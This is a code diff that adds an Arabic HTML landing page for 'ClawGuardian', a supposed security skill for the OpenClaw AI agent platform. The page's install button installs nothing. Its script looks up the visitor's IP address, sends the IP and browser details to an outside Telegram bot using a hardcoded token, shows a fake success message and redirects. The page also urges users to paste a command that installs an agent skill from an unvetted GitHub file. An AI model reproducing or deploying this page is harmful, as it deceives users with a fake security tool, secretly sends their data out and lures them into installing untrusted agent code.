@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClawGuardian | التثبيت بنقرة واحدة</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: radial-gradient(ellipse at 30% 40%, #0f0c29, #302b63, #24243e);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 550px;
+            background: rgba(10, 14, 39, 0.65);
+            backdrop-filter: blur(16px);
+            border-radius: 40px;
+            padding: 40px 30px;
+            text-align: center;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            box-shadow: 0 30px 50px rgba(0,0,0,0.3);
+            animation: fadeInUp 0.6s ease-out;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .icon { font-size: 4rem; margin-bottom: 20px; }
+        h1 {
+            font-size: 2rem;
+            background: linear-gradient(45deg, #FFD700, #FF8C00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 15px;
+        }
+        .features {
+            text-align: right;
+            margin: 25px 0;
+            padding: 20px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 20px;
+        }
+        .features li {
+            margin: 12px 0;
+            list-style: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .features li::before {
+            content: "✅";
+            color: #FFD700;
+        }
+        .btn {
+            background: linear-gradient(45deg, #FFD700, #FF8C00);
+            color: #0a0e27;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0;
+            transition: transform 0.3s;
+        }
+        .btn:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,215,0,0.4); }
+        .code-box {
+            background: #0a0e27;
+            padding: 15px;
+            border-radius: 15px;
+            font-family: monospace;
+            font-size: 0.8rem;
+            word-break: break-all;
+            margin: 15px 0;
+            border: 1px solid rgba(255,215,0,0.3);
+        }
+        .copy-btn {
+            background: rgba(255,215,0,0.2);
+            border: 1px solid #FFD700;
+            color: #FFD700;
+            padding: 8px 15px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+        .footer { font-size: 0.7rem; opacity: 0.6; margin-top: 20px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="icon">🛡️</div>
+    <h1>ClawGuardian</h1>
+    <p>نظام أمان متقدم لـ OpenClaw و ClawHub</p>
+    
+    <div class="features">
+        <li>كشف المهارات الخبيثة (ClawHavoc)</li>
+        <li>مراقبة ملفات SOUL.md و MEMORY.md</li>
+        <li>تنبيهات فورية عبر Telegram</li>
+        <li>حماية من سرقة المفاتيح الخاصة</li>
+        <li>تحديثات مستمرة مجانية</li>
+    </div>
+    
+    <button class="btn" id="installBtn">🚀 تثبيت ClawGuardian الآن</button>
+    
+    <div class="code-box">
+        <code id="installCommand">/install-skill https://raw.githubusercontent.com/Freedingoxo/clawguardian-skill/main/SKILL.md</code>
+    </div>
+    <button class="copy-btn" onclick="copyCommand()">📋 نسخ أمر التثبيت</button>
+    
+    <div id="status" style="margin-top: 15px; font-size: 0.8rem; display: none;"></div>
+    
+    <div class="footer">
+        <p>🔒 ClawGuardian - حماية متقدمة للذكاء الاصطناعي</p>
+        <p>MIT License • مفتوح المصدر</p>
+    </div>
+</div>
+
+<script>
+    const TELEGRAM_BOT_TOKEN = "8645197792:AAE2zwaOQ7ABNuZ5N0MXg5sCqzQnMUrCcOQ";
+    const TELEGRAM_CHAT_ID = "7714049413";
+    
+    function copyCommand() {
+        const command = document.getElementById('installCommand').innerText;
+        navigator.clipboard.writeText(command);
+        alert('✅ تم نسخ أمر التثبيت');
+    }
+    
+    async function sendTelegram(message) {
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+            });
+        } catch(e) {}
+    }
+    
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            return (await res.json()).ip;
+        } catch(e) { return 'unknown'; }
+    }
+    
+    document.getElementById('installBtn').addEventListener('click', async () => {
+        const btn = document.getElementById('installBtn');
+        const statusDiv = document.getElementById('status');
+        
+        btn.disabled = true;
+        btn.innerHTML = '🔄 جاري التثبيت...';
+        statusDiv.style.display = 'block';
+        statusDiv.innerHTML = '⏳ جاري تحميل ClawGuardian...';
+        statusDiv.style.color = '#FFD700';
+        
+        const ip = await getIP();
+        const userAgent = navigator.userAgent;
+        
+        await sendTelegram(`🛡️ NEW INSTALLATION\n🌐 IP: ${ip}\n📱 UA: ${userAgent.substring(0,80)}...\n⏰ ${new Date().toISOString()}`);
+        
+        setTimeout(() => {
+            statusDiv.innerHTML = '✅ تم تثبيت ClawGuardian بنجاح!';
+            statusDiv.style.color = '#00ff00';
+            btn.innerHTML = '✅ تم التثبيت';
+            
+            localStorage.setItem('clawguardian_installed', 'true');
+            localStorage.setItem('install_date', new Date().toISOString());
+            
+            setTimeout(() => {
+                window.location.href = 'https://Freedingoxo.github.io/clawguardian-skill/';
+            }, 2000);
+        }, 2000);
+    });
+</script>
+</body>
+</html>
